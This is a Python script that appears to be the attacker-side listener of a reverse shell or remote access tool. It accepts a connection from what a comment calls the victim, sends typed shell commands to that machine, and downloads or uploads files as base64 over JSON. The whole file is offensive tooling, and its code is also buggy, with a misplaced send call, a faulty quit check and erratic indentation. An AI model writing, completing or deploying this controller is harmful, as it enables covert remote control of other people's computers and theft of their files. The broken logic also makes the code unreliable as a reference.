import socket
import json
import base64

def reliable_send(data): #send and recieve data as much as we want
    try:
        if isinstance(data, bytes):
            # If data is bytes, encode it to a base64-encoded string as we are getting data in 
            #Base64 encoding is a method to encode binary data as ASCII characters.

            json_data = json.dumps({'data': base64.b64encode(data).decode()})
            
        else:
            # Otherwise, serialize the data as JSON
            json_data = json.dumps({'data': data})
            
            
            client.send(json_data.encode())  # Send the JSON data in sequesnce bytes using UTF8 encoded
    except Exception as e:
        print("Error sending data:", e)

def reliable_recv():
       
 data = b""  # Initialize as bytes
     
 while True:
      try: 
                  
         data=data+client.recv(1024)
         json_message = data.decode() 
         data = json.loads(json_message)  # Parse the JSON message
         if 'data' in data:  # If the received JSON has a 'data' key
                    # Decode the Base64-encoded data
                    data['data'] = base64.b64decode(data['data']).decode()
                    
                    
         return data['data']   
        
      except :
         continue
        
      

#client.send("Thank you for connecting".encode())

def shell(): #shell function
    while True:
        Message=input(" Enter text to send message to : " )
        #client.send(Message.encode())
        reliable_send(Message)
        if Message == ("q" or "Q"):
            break
        elif Message[:2] == "cd" and len(Message)>1:
            continue
        elif Message[:8] == "download":
           try: 
            file =open(Message[9:],"wb")  #w --write b--bytes(images and other data)
            result=reliable_recv()
            file.write(base64.b64decode(result))
            
           except Exception as e:
               print("Failed to download",e) 
        elif Message[:6] =="upload":
            try:
                file1=open(Message[7:],"rb")
                reliable_send(base64.b64encode(file1.read()))
            except:
                  failed="Failed to upload"
                  reliable_send(base64.b64encode(failed))
                    

        
        else:
            result=reliable_recv()
            print(result)



 


def server(): #client server connection
    global s
    global client
    global ip
    s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    print("Socket successfully created")
    port = 54320

    s.bind(("0.0.0.0",port))  #IP address of victim 
    print("Socket binded to %s" %port)

    s.listen(5)
    print("Socket is listening")

    #while True:
    #Establish connection with client 
    client, ip =s.accept()
    print("Connected to " ,client)

server()
shell()
client.close()